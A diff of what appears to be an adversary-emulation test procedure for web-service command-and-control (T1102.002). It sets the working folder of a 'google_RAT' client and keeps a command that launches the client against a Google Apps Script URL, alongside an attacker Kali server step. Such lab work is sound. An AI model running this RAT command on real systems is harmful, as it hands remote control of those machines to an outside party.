@@ -16,7 +16,7 @@ Step 3. 우 클릭 후 "create dump file"
 #------------------------------------------------------------
 [Client PC - Windows10]
 Step 1. Open "cmd.exe"
-Step 2. cd <inplant.py 위치>
+Step 2. cd "C:\round5test\atomics\T1102.002A\src\google_RAT-master\google_RAT-master\client"
 Step 3. python test.py -k test https://script.google.com/macros/s/AKfycbzVbXkfOAJTmzxSUDeeuyYW-RJ6CMrFzF8bWtXObtSQWMmzINoXgi2isks5S2m6q6X7kw/exec
 
 [Attacker's Server - Kali]
